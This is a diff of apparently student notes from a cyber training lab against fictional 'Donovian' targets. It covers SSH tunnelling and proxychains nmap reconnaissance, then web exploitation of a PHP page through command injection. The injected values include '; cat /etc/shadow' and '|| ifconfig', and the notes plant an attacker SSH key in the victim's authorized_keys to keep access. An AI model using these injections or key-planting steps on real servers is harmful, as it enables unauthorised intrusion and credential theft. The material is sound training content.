@@ -1,4 +1,5 @@
 DAY1
+Reconnaissance
 Scheme of Maneuver:
 >Jump Box
 ->Network scan: 192.168.28.96/27
@@ -7,6 +8,7 @@ Scheme of Maneuver:
 
 linOPS: ssh -M -S /tmp/jump -o StrictHostKeyChecking=no -o userknownhostsFile=/dev/null student@10.50.43.220
 linOPS: ssh -S /tmp/jump student -D 9050
+linOPS: ssh -S /tmp/jump user -O forward -L 2222:<ip>:22
 linOPS: proxychains nmap -Pn -sT -n -p ports <ip>
 ================================================================
 Nmap scan report for 192.168.28.105
@@ -47,3 +49,104 @@ Not shown: 65533 closed ports
 PORT     STATE SERVICE
 80/tcp   open  http
 2222/tcp open  EtherNetIP-1
+
+
+===========================================================================
+===========================================================================
+DAY 2
+Exploit Research
+Web Exploitation
+
+Scheme of Maneuver:
+>Jump Box
+->T1:10.100.28.40
+
+Target Section:
+
+T1
+Hostname: Donovian_MI_websvr
+IP: 10.100.28.40
+OS: unknown
+Creds:unknown
+Last Known SSH Port: unknown
+PSP: Unknown
+Malware: Unknown
+Action: Conduct approved Web Exploitation techniques to collect intellegence.
+
+ssh to jump
+ssh dynamic
+ssh -S /tmp/jump user -O forward -L 2345:10.100.28.40:22    ip is T1
+student@lin-ops:~$ proxychains nmap -Pn -T4 -sT -p 80 --script http-enum.nse 10.100.28.40
+Nmap scan report for 10.100.28.40
+Host is up (0.0082s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum: 
+|   /robots.txt: Robots file
+|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+
+
+student@lin-ops:~$ proxychains nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse 10.100.28.40 
+Nmap scan report for 10.100.28.40
+Host is up (0.0075s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-robots.txt: 1 disallowed entry 
+|_/net_test
+
+firefox 127.0.0.1:2345
+http://127.0.0.1:2345/uploads/message
+Just completed my Cyber Awareness training and it says ATOPIA. Last I checked that is a whole other country.
+Please send me a corrected cert with the right now.
+I took my online training from the following website
+10.100.28.55
+
+http://127.0.0.1:2345/net_test/industry_check.php
+whoami
+billybob billybob
+
+; cat /etc/shadow
+2GA7vl05Y8DTOjHnD3z6
+
+|| ifconfig
+ens3: flags=4163 mtu 1450 inet 10.100.28.40 netmask 255.255.255.224 broadcast 10.100.28.63 inet6 fe80::f816:3eff:fe02:944c prefixlen 64 scopeid 0x20 ether fa:16:3e:02:94:4c txqueuelen 1000 (Ethernet) RX packets 619085 bytes 203683835 (203.6 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 713066 bytes 85084445 (85.0 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73 mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10 loop txqueuelen 1000 (Local Loopback) RX packets 547373 bytes 89712419 (89.7 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 547373 bytes 89712419 (89.7 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
+
+; ls -latr & netstat -rn
+Kernel IP routing table Destination Gateway Genmask Flags MSS Window irtt Iface 0.0.0.0 10.100.28.33 0.0.0.0 UG 0 0 0 ens3 10.100.28.32 0.0.0.0 255.255.255.224 U 0 0 0 ens3 total 12 -rw-r--r-- 1 root root 1581 Mar 23 2022 industry_check.php drwxr-xr-x 2 root root 4096 Apr 19 2022 . drwxr-xr-x 7 root root 4096 Apr 19 2022 .. drwxr-xr-x 7 root root 4096 Apr 19 2022 ..
+
+ssh-keygen -t rsa
+-skip everything else-
+
+ cat ~/.ssh/id_rsa.pub
+copy whole bitch
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGqOXksZgFEr9tvx6D4O5PpcPw/BHGSuJsFMnMpqi7I+IbixSbWMZuoZ7NDQBoXC3Wq12WBmzAjdN4EHwadd8qRC4Ym4aI/NtwMseS9U3H1QQfYehKhlAodecCIx+6OMwVGrR417sMDcp0QatQlcWJ94bREXtpxgIQ8djqUmaZ5u2700ZJE/HgcXjKQ7IC01hccrdWEOOu0QiFVcMC7RZsjWXw/dnt4IAUsxVsFOsBN4b6Jn12cAay9v9tjnARqphj3mxXAe9q/h8FuCYzbTNCKmrnkJe9RTT5w0lru/tqJCezlkwAHX445tAdGWSoIXUNth6tKnlGYhAQ5FkREIIf student@lin-ops
+
+; mkdir /home/billybob/.ssh
+; echo "public key here" >> /home/billybob/.ssh/authorized_keys
+; cat /billybob/home/.ssh/authorized_keys
+
+linOPS: ssh -S /tmp/jump user -O forward -L 6789:10.100.28.40:4444
+ssh billybob@localhost -p 6789
+
+in /home, ls, follow that new user
+cd into /var/www/html
+look into Contract_bids.html
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
